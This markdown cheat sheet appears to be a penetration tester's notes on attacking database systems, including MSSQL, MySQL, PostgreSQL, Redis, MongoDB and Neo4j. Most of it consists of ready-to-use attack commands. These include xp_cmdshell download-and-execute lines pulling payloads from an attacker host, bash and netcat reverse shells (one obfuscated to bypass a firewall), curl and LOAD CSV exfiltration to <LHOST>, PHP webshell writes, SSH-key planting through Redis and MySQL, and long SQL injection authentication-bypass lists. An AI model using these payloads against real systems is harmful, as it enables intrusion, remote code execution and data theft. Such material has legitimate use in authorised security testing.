# Database Assessment

- [Resources](#resources)

## Table of Contents

- [H2](#h2)
- [Hibernate Query Language Injection (HQLi)](#hibernate-query-language-injection-hqli)
- [impacket-mssqlclient](#impacket-mssqlclient)
- [MongoDB](#mongodb)
- [MDB Tools](#mdb-tools)
- [MSSQL](#mssql)
- [MySQL](#mysql)
- [mysqldump](#mysqldump)
- [Neo4j](#neo4j)
- [NoSQL Injection](#nosql-injection)
- [PostgreSQL](#postgresql)
- [Redis](#redis)
- [SQL](#sql)
- [sqlcmd](#sqlcmd)
- [SQL Injection (SQLi)](#sql-injection-sqli)
- [sqlite3](#sqlite3)
- [sqlmap](#sqlmap)
- [sqlmap Websocket Proxy](#sqlmap-websocket-proxy)
- [sqsh](#sqsh)
- [XPATH Injection](#xpath-injection)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| Advanced SQL Injection Cheatsheet | A cheat sheet that contains advanced queries for SQL Injection of all types. | https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet |
| Cypher Injection Cheat Sheet | n/a | https://pentester.land/blog/cypher-injection-cheatsheet/#cypher-queries |
| NoSQLMap | NoSQLMap is an open source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases and web applications using NoSQL in order to disclose or clone data from the database. | https://github.com/codingo/NoSQLMap |
| RedisModules-ExecuteCommand | Tools, utilities and scripts to help you write redis modules! | https://github.com/n0b0dyCN/RedisModules-ExecuteCommand |
| Redis RCE | Redis 4.x/5.x RCE | https://github.com/Ridter/redis-rce |
| Redis Rogue Server | Redis(<=5.0.5) RCE | https://github.com/n0b0dyCN/redis-rogue-server |
| SQL Injection Cheatsheet | Tib3rius | https://tib3rius.com/sqli.html |
| SQL injection cheat sheet | This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks. | https://portswigger.net/web-security/sql-injection/cheat-sheet |
| SQL Injection Payload List | SQL Injection Payload List | https://github.com/payloadbox/sql-injection-payload-list |
| sqlmap | sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. | https://github.com/sqlmapproject/sqlmap |
| sqlmap Websocket Proxy | Tool to enable blind sql injection attacks against websockets using sqlmap | https://github.com/BKreisel/sqlmap-websocket-proxy |

## H2

### Code Execution

```console
CREATE ALIAS EXECVE AS $$ String execve(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A"); return s.hasNext() ? s.next() : ""; }$$;
```

```console
CALL EXECVE('id')
```

## Hibernate Query Language Injection (HQLi)

```console
uid=x' OR SUBSTRING(username,1,1)='m' and ''='&auth_primary=x&auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6
```

## impacket-mssqlclient

> https://github.com/fortra/impacket

### Common Commands

```console
SQL> enum_logins
SQL> enum_impersonate
```

### Connection

```console
$ impacket-mssqlclient <USERNAME>@<RHOST>
$ impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
$ impacket-mssqlclient -k -no-pass <RHOST>
$ impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```console
$ export KRB5CCNAME=<USERNAME>.ccache
$ impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

### Privilege Escalation

```console
SQL> exec_as_login sa
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

## MongoDB

### Client Installation

```console
$ sudo apt-get install mongodb-clients
```

### Usage

```console
$ mongo "mongodb://localhost:27017"
```

### Common Commands

```console
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

### User Password Reset to "12345"

```console
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

## MDB Tools

> https://github.com/mdbtools/mdbtools

```console
=> list tables     // show tables
=> go              // executes commands
```

```console
$ mdb-sql <FILE>
```

## MSSQL

### Connection

```console
$ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
$ impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
```

### Common Commands

```console
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```

### Show Database Content

```console
1> SELECT name FROM master.sys.databases
2> go
```

### OPENQUERY

```console
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```console
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

### Binary Extraction as Base64

```console
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

### Steal NetNTLM Hash / Relay Attack

```console
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

### Linked SQL Server Enumeration

#### Common Commands

```console
SQL> enum_links
SQL> EXECUTE('select @@servername, @@version') AT [<RHOST>];
SQL> use_link [PRIMARY]
SQL> exec_as_login sa
```

#### Advanced Enumeration

```console
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### Python Code Execution

```console
SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'print( "foobar" );';
SQL> EXEC sp_execute_external_script @language = N'Python', @script = N'import os;os.system("whoami");';
```

### Register new Sysadmin User

```console
SQL> EXEC ('EXEC (''EXEC sp_addlogin ''''sadmin'''', ''''p4ssw0rd!'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''sadmin'''',''''sysadmin'''''') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

### xp_cmdshell

#### Impersonate SA

```console
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC sp_configure 'Show Advanced Options', 1; 
SQL> RECONFIGURE; 
SQL> EXEC sp_configure 'xp_cmdshell', 1; 
SQL> RECONFIGURE;
SQL> EXEC xp_cmdshell 'dir';
```

#### Execute Script HTTP Server

```console
SQL> xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://<LHOST>/<SCRIPT>.ps1\");"
```

#### Start xp_cmdshell via MSSQL

```console
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

##### Alternative Way to start xp_cmdshell

```console
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

#### Import PowerShell Scripts and execute Commands

##### Without Authentication

```console
SQL> xp_cmdshell powershell -c import-module C:\PATH\TO\FILE\<FILE>.ps1; <FILE> <OPTIONS>
```

##### With Authentication

```console
SQL> xp_cmdshell "powershell $cred = New-Object System.Management.Automation.PSCredential(\"<USERNAME>\",\"<PASSWORD>\");Import-Module C:\PATH\TO\FILE\<FILE>.ps1;<FILE> <OPTIONS>
```

#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) on a Logon Field

```console
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

#### MSSQL SQL Injection (SQLi) to Remote Code Execution (RCE) in URL

```console
http://<RHOST>/index.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

```console
http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>/<FILE>.exe C:\Windows\Temp\<FILE>.exe'; --
```

```console
http://<RHOST>/index.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\<FILE>.exe'; --
```

### Relative Identifier (RID) Transformation and User Enumeration

#### Transformation

##### Python Solution

```python
def hex_sid_to_string_sid(hex_sid):
    sid_bytes = bytes.fromhex(hex_sid[2:])
    revision = sid_bytes[0]
    sub_auth_count = sid_bytes[1]
    identifier_authority = int.from_bytes(sid_bytes[2:8], byteorder='big')
    sub_authorities = [
        int.from_bytes(sid_bytes[8 + (i * 4):12 + (i * 4)], byteorder='little')
        for i in range(sub_auth_count)
    ]
    string_sid = f"S-{revision}-{identifier_authority}"
    for sub_auth in sub_authorities:
        string_sid += f"-{sub_auth}"
    return string_sid

hex_sid = "0x010500000000000515000000a185deefb22433798d8e847a00020000"
sid = hex_sid_to_string_sid(hex_sid)
print(sid)
```

##### PowerShell Solution

```powershell
$BinarySID = "010500000000000515000000a185deefb22433798d8e847a00020000"
$SIDBytes = [byte[]]::new($BinarySID.Length / 2)
for ($i = 0; $i -lt $BinarySID.Length; $i += 2) {
    $SIDBytes[$i / 2] = [convert]::ToByte($BinarySID.Substring($i, 2), 16)
}
$SID = New-Object System.Security.Principal.SecurityIdentifier($SIDBytes, 0)
$SID.Value
```

#### User Enumeration

##### Python Solution

```python
def generate_rid_queries(base_sid, start_rid, count, output_file):
    with open(output_file, "w") as file:
        for rid in range(start_rid, start_rid + count):
            hex_rid = f"{rid:08X}" 
            reversed_rid = ''.join(
                [hex_rid[i:i+2] for i in range(0, len(hex_rid), 2)][::-1]
            )
            full_sid = f"{base_sid}{reversed_rid}"
            query = f"SELECT SUSER_SNAME({full_sid})"
            file.write(query + "\n")

if __name__ == "__main__":
    generate_rid_queries("0x010500000000000515000000A185DEEFB22433798D8E847A", 500, 1000, "queries.txt")
```

##### Bash Solution

```bash
#!/bin/bash

USERNAME="<USERNAME>"
PASSWORD="<PASSWORD>"
SERVER="<RHOST>"
SID_BASE="S-1-5-21-4024337825-2033394866-2055507597"

for SID in {1100..1200}; do
    QUERY="SELECT SUSER_SNAME(SID_BINARY(N'$SID_BASE-$SID'))"
    echo "$QUERY" > query.sql
    mssqlclient.py "$USERNAME:$PASSWORD@$SERVER" -file query.sql  | grep -a <DOMAIN>
    rm query.sql
done
```

## MySQL

> https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

```console
$ mysql -u root -p
$ mysql -u <USERNAME> -h <RHOST> -p
$ mysql -u <USERNAME> -h <RHOST> -p --skip-ssl
```

### Common Commands

```console
mysql> STATUS;
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT version();
mysql> SELECT system_user();
mysql> SELECT * FROM Users;
mysql> SELECT * FROM users \G;
mysql> SELECT Username,Password FROM Users;
musql> SELECT user, authentication_string FROM mysql.user WHERE user = '<USERNAME>';
mysql> SHOW GRANTS FOR '<USERNAME>'@'localhost' \G;
```

### Enumerate Version

```console
$ mysql -u root -p -e 'select @@version;'
```

### Skip SSL Verification

```console
$ mysql -h <RHOST> -u <USERNAME> --skip-ssl -p
$ mysql -h <RHOST> -P <RPORT> -u <USERNAME> --skip-ssl -p
```

### Password Reset

```console
$ sudo systemctl stop mysql.service
$ sudo mysqld_safe --skip-grant-tables &
$ mysql -uroot
$ use mysql;
$ update user set authentication_string=PASSWORD("mynewpassword") where User='root';
$ flush privileges;
$ quit
$ sudo systemctl start mysql.service
```

> https://bcrypt-generator.com/

```console
mysql> UPDATE user SET password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
mysql> UPDATE users SET password = '$2a$12$QvOBZ0r4tDdDCib4p8RKGudMk0VZKWBX21Dxh292NwrXwzwiuRIoG';
```

### Update User Privileges

```console
mysql> UPDATE user set is_admin = 1 where name = "<USERNAME>";
```

### Base64 Encoding

```console
mysql> SELECT TO_BASE64(password) FROM accounts where id = 1;
```

### Read a File

```console
mysql> SELECT LOAD_FILE('/etc/passwd');
mysql> SELECT LOAD_FILE('C:\\PATH\\TO\\FILE\\<FILE>');
mysql> SELECT CAST(LOAD_FILE('/etc/passwd') AS CHAR)\G;
```

### User Privilege Check

```console
mysql> SELECT group_concat(grantee, ":",privilege_type) FROM information_schema.user_privileges
```

### File Privilege Check

```console
mysql> SELECT file_priv FROM mysql.user WHERE user = 'netspi'
mysql> SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee LIKE '%netspi%'
```

### Drop a Shell

```console
mysql> \! sh;
mysql> \! /bin/sh;
```

### Insert Code to get executed

```console
mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
```

### Write SSH Key into authorized_keys2 file

```console
mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
```

### Create Database

```console
MariaDB [(none)]> CREATE DATABASE <DATABASE>;
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> INSERT INTO mysql.user (User,Host,authentication_string,SSL_cipher,x509_issuer,x509_subject)
    -> VALUES('<USERNAME>','%',PASSWORD('<PASSWORD>'),'','','');
Query OK, 1 row affected (0.001 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.## TO '<USERNAME>'@'%';
Query OK, 0 rows affected (0.001 sec)

MariaDB [(none)]> use <DATABASE>
Database changed

MariaDB [admirer]> create table <TABLE>(data VARCHAR(255));
Query OK, 0 rows affected (0.008 sec)
```

### Configure Remote Access

```console
$ sudo vi /etc/mysql/mariadb.conf.d/50-server.cnf
```

```console
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
#bind-address            = 127.0.0.1
bind-address            = 0.0.0.0
```

```console
MariaDB [mysql]> FLUSH PRIVILEGES;
MariaDB [mysql]> GRANT ALL ON *.* TO 'root'@'%' IDENTIFIED BY '<PASSWORD>';
```

### Attach External Database

```console
$ sudo systemctl start mysql.service
$ sqlite3
```

```console
sqlite> attach "Audit.db" as db1;
sqlite> .databases
main:
db1: /PATH/TO/DATABASE/<DATABASE>.db
sqlite> .tables
db1.DeletedUserAudit  db1.Ldap              db1.Misc
sqlite> SELECT ## FROM db1.DeletedUserAudit;
```

## mysqldump

```console
$ mysqldump --databases <DATABASE> -u<USERNAME> -p<PASSWORD>    // no space between parameter and input!
```

## Neo4j

### Cypher Injection

#### Enumerating Labels

```console
{"username":"' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://<LHOST>/?label='+label as l RETURN 0 as _0 //","password":"foobar"}
```

#### Enumerating Relationship Types

```console
{"username":"' OR 1=1 WITH 1 as a CALL db.relationshipTypes() YIELD relationshipType LOAD CSV FROM 'http://<LHOST>/?rel='+relationshipType as l RETURN 0 as _0 //","password":"user"}
```

#### Enumerating Property Keys

```console
{"username":"' OR 1=1 WITH 1 as a CALL db.propertyKeys() YIELD propertyKey LOAD CSV FROM 'http://<LHOST>/?prop='+propertyKey as l RETURN 0 as _0 //","password":"user"}
```

## NoSQL Injection

```console
admin'||''==='
{"username": {"$ne": null}, "password": {"$ne": null} }
```

### Bruteforce Values

```python
import requests
import re
import string

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }

url = "<RHOST>/?search=admin"

done = False
pos = 0
key = ""
while not done:
  found = False
  for _, c in enumerate(string.digits+string.ascii_lowercase+'-'):
    payload = url + "' %26%26 this.password.match(/^"+key+c+".*$/)%00"
    r = requests.get(payload, proxies=proxyDict)
    if "admin</a>" in r.text:
      found = True
      key += c
      print key
      break
  if not found:
    print "Done."
    break
  pos += 1
```

## PostgreSQL

```console
$ psql
$ psql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
$ psql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>
```

### Common Commands

```console
postgres=# \l                        // list all databases
postgres=# \list                     // list all databases
postgres=# \c                        // use database
postgres=# \c <DATABASE>             // use specific database
postgres=# \s                        // command history
postgres=# \q                        // quit
<DATABASE>=# \dt                     // list tables from current schema
<DATABASE>=# \dt *.*                 // list tables from all schema
<DATABASE>=# \du                     // list users roles
<DATABASE>=# \du+                    // list users roles
<DATABASE>=# SELECT user;            // get current user
<DATABASE>=# TABLE <TABLE>;          // select table
<DATABASE>=# SELECT * FROM users;    // select everything from users table
<DATABASE>=# SHOW rds.extensions;    // list installed extensions
<DATABASE>=# SELECT usename, passwd from pg_shadow;                         // read credentials
<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --                               // read directories
<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --    // read a file
```

### Postgres Remote Code Execution

> https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program

```console
<DATABASE>=# x'; COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>?f=`whoami|base64`'-- x
```

or

```console
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);
<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';
<DATABASE>=# SELECT * FROM cmd_exec;
<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;
```

#### Reverse Shell

Notice that in order to scape a single quote you need to put `2 single` quotes.

```console
<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';
```

or

```console
<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<LPORT>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```

#### File Write

```console
<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';"
```

#### Web Application Firewall (WAF) Bypass

##### Reverse Shell

```console
<DATABASE>=# EXECUTE CHR(67)||CHR(82)||CHR(69)||CHR(65)||CHR(84)||CHR(69)||' TABLE shell(output text);'
```

```console
DO $$
DECLARE
    c text;
BEGIN
    c := CHR(67)||CHR(79)||CHR(80)||CHR(89)||
        ' (SELECT '''') to program ''bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"''';
    EXECUTE c;
END $$;
```

## Redis

```console
$ redis-cli -h <RHOST>
$ redis-cli -s /run/redis/redis.sock
```

### Common Commands

```console
> AUTH <PASSWORD>
> AUTH <USERNAME> <PASSWORD>
> INFO SERVER
> INFO keyspace
> CONFIG GET *
> SELECT <NUMBER>
> KEYS *
> GET
> HSET       // set value if a field within a hash data structure
> HGET       // retrieves a field and his value from a hash data structure
> HKEYS      // retrieves all field names from a hash data structure
> HGETALL    // retrieves all fields and values from a hash data structure
> GET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b
> SET PHPREDIS_SESSION:2a9mbvnjgd6i2qeqcubgdv8n4b "username|s:8:\"<USERNAME>\";role|s:5:\"admin\";auth|s:4:\"True\";" # the value "s:8" has to match the length of the username
```

#### Examples

##### Add User

```console
redis /run/redis/redis.sock> HSET barfoo username foobar
redis /run/redis/redis.sock> HSET barfoo first-name foo
redis /run/redis/redis.sock> HSET barfoo last-name bar
redis /run/redis/redis.sock> HGETALL barfoo
```

##### Retrieve a specific Value

```console
redis /run/redis/redis.sock> KEYS *
redis /run/redis/redis.sock> SELECT 1
redis /run/redis/redis.sock> TYPE <VALUE>
redis /run/redis/redis.sock> HKEYS <VALUE>
redis /run/redis/redis.sock> HGET <VALUE> password
```

### Enter own SSH Key

```console
$ redis-cli -h <RHOST>
$ echo "FLUSHALL" | redis-cli -h <RHOST>
$ (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /PATH/TO/FILE/<FILE>.txt
$ cat /PATH/TO/FILE/<FILE>.txt | redis-cli -h <RHOST> -x set s-key
<RHOST>:6379> get s-key
<RHOST>:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
<RHOST>:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
<RHOST>:6379> CONFIG SET dbfilename authorized_keys
OK
<RHOST>:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "authorized_keys"
<RHOST>:6379> save
OK
```

## SQL

### Write to File

```console
SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/PATH/TO/FILE/<FILE>'
```

## sqlcmd

```console
$ sqlcmd -S <RHOST> -U <USERNAME>
$ sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
```

## SQL Injection (SQLi)

> https://github.com/payloadbox/sql-injection-payload-list

> https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet

### Comments

```console
#       // Hash comment
/*      // C-style comment
-- -    // SQL comment
;%00    // Nullbyte
`       // Backtick
```

### Wildcard Operators

`%a` value starts with `a`
`e%` value ends with `e`

### Protection

* Prepared Statements (Parameterized Queries)
* Input Validation
* Escaping User Input

### Master List

```console
';#---
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-
```

### Authentication Bypass

```console
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
' || '1'='1';-- -
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 LIKE 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
```

### Testing APIs

```console
{"id":"56456"}                   // ok
{"id":"56456 AND 1=1#"}          // ok
{"id":"56456 AND 1=2#"}          // ok
{"id":"56456 AND 1=3#"}          // error
{"id":"56456 AND sleep(15)#"}    // sleep 15 seconds
```

### Payload Examples

```console
SELECT * FROM users WHERE username = 'admin' OR 1=1-- -' AND password = '<PASSWORD>';
```

```console
1%27/**/%256fR/**/50%2521%253D22%253B%2523=="0\"XOR(if(now()=sysdate(),sleep(9),0))XOR\"Z",===query=login&username=rrr';SELECT PG_SLEEP(5)--&password=rr&submit=Login==' AND (SELECT 8871 FROM (SELECT(SLEEP(5)))uZxz)
```

#### Explanation

```console
1=1    // is always true
--     // comment
-      // special character at the end just because of sql
```

### Common Injections

#### MySQL & MariaDB

##### Get Number of Columns

```console
-1 order by 3;#
```

##### Get Version

```console
-1 union select 1,2,version();#
```

##### Get Database Name

```console
-1 union select 1,2,database();#
```

##### Get Table Name

```console
-1 union select 1,2, group_concat(table_name) from information_schema.tables where table_schema="<DATABASE>";#
```

##### Get Column Name

```console
-1 union select 1,2, group_concat(column_name) from information_schema.columns where table_schema="<DATABASE>" and table_name="<TABLE>";#
```

##### Read a File

```console
SELECT LOAD_FILE('/etc/passwd')
```

##### Dump Data

```console
-1 union select 1,2, group_concat(<COLUMN>) from <DATABASE>.<TABLE>;#
```

##### Create Webshell

```console
LOAD_FILE('/etc/httpd/conf/httpd.conf')
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/<FILE>.php";
```

or

```console
LOAD_FILE('/etc/httpd/conf/httpd.conf')
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/<FILE>.php" -- //
```

#### MSSQL

##### Authentication Bypass

```console
' or 1=1--
```

##### Get Version with Time-Based Injection

```console
' SELECT @@version; WAITFOR DELAY '00:00:10'; —
```

##### Enable xp_cmdshell

```console
' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

##### Remote Code Execution (RCE)

```console
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>.ps1')" ;--
```

#### Orcale SQL

##### Authentication Bypass

```console
' or 1=1--
```

##### Get Number of Columns

```console
' order by 3--
```

##### Get Table Name

```console
' union select null,table_name,null from all_tables--
```

##### Get Column Name

```console
' union select null,column_name,null from all_tab_columns where table_name='<TABLE>'--
```

##### Dump Data

```console
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

#### SQLite

##### Extracting Table Names

```console
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(tbl_name),4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

##### Extracting User Table

```console
http://<RHOST>/index.php?id=-1 union select 1,2,3,group_concat(password),5 FROM users--
```

### Error-based SQL Injection (SQLi)

```console
<USERNAME>' OR 1=1 -- //
```

Results in:

```console
SELECT * FROM users WHERE user_name= '<USERNAME>' OR 1=1 --
```

```console
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

### UNION-based SQL Injection (SQLi)

#### Manual Injection Steps

```console
$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["search_input"]."%'";
```

```console
' ORDER BY 1-- //
```

```console
%' UNION SELECT database(), user(), @@version, null, null -- //
```

```console
' UNION SELECT null, null, database(), user(), @@version  -- //
```

```console
' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() -- //
```

```console
' UNION SELECT null, username, password, description, null FROM users -- //
```

### Blind SQL Injection (SQLi)

```console
http://<RHOST>/index.php?user=<USERNAME>' AND 1=1 -- //
```

```console
http://<RHOST>/index.php?user=<USERNAME>' AND IF (1=1, sleep(3),'false') -- //
```

### Manual SQL Injection

#### Skeleton Payload

```console
SELECT ? FROM ? WHERE ? LIKE '%amme%';    // control over amme
SELECT ? FROM ? WHERE ? LIKE '%'%';       // errors out because of the single quote
SELECT ? FROM ? WHERE ? LIKE '%';-- %';   // wildcard wich equals = ';--
SELECT ? FROM ? WHERE ? LIKE '%hammer' AND 1 = SLEEP(2);-- %';    // blind sql injection because of sleep is implemented in mysql
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT 1,2,3 FROM dual);-- %';    // UNION sticks together two columns and put it out; output queries to the screen is super bad!
```

- JOIN = merging columns 1 by 1
- UNION = appending

```console
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3) FROM information_schema.tables;-- %';    // information_schema.tables is an information table
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT COLUMN_NAME, 2,3 FROM information_schema.columns WHERE TABLE_NAME = 'users');-- %';
SELECT ?,?,? FROM ? WHERE ? LIKE '%hammer' UNION (SELECT uLogin, uHash, uType FROM users);-- %';
```

### Manual In-Band SQL Injection

> https://<RHOST>/article?id=3

```console
'    # causes error printed out on the page
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3    # received a message about the columns
0 UNION SELECT 1,2,3    # output from two tables
0 UNION SELECT 1,2,database()    # received database name
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '<DATABASE>'
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.columns WHERE table_name = '<TABLE>'
